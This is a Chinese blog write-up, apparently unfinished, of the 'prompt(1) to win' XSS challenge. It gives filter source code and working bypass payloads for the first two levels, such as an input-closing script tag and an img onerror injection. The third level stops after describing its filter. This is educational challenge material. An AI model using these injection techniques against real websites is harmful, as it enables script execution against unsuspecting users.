---
layout: post
title: prompt(1)-to-win-Write-Up
date: 2017-07-28 
categories: XSS(未完成)  
---


## 介绍

### 关于站点

这个站点的灵感来自于[alert(1) to win](https://alf.nu/alert1)。在没有用户交互的情况下调用`prompt(1)`就算作成功。

### 0x00

第一题源码是这样的

	function escape(input) {
	    // warm up
	    // script should be executed without user interaction
	    return '<input type="text" value="' + input + '">';
	}        

![](/images/posts/xss/1.png)
此处的input就是你输入的所在位置。第一题源码很简单，先使用`1">`，句子成为`<input type="text" value="1"> ">`这样就使<input>闭合掉了。这时候就可以随心所欲的写入xss语句了。例如最常见的语句`<script>prompt(1)</script>`。拼合起来就是Payload：

`1"><script>prompt(1)</script>`

### 0x01

源码如下，这里用正则全局匹配过滤了`<xxx>`，那我们就构造`<xxx`不加上`>`。这种要求img标签可以实现，所以`<img src="#" onerror=prompt(1)`。但是现在处于`<article>`标签下，所以使用`//`注释符注释掉，这样img标签就不在article便签下，也就能正常工作了。

	function escape(input) {
	    // tags stripping mechanism from ExtJS library
	    // Ext.util.Format.stripTags
	    var stripTagsRE = /<\/?[^>]+>/gi;
	    input = input.replace(stripTagsRE, '');
	
	    return '<article>' + input + '</article>';
	}      
	
所以最后的Payload如下：
`<img src="#" onerror=prompt(1)//`

### 0x02

 源码源码源码～～～
 
	 function escape(input) {
	    //                      v-- frowny face
	    input = input.replace(/[=(]/g, '');
	
	    // ok seriously, disallows equal signs and open parenthesis
	    return input;
	}   
	
`=（`被过滤了，

转载请注明：[碎雪的小屋](http://RoyTse.github.io) » [0x00-X-Man夏令营](http://RoyTse.github.io/2017/07/prompt(1)-to-win-Write-Up/)  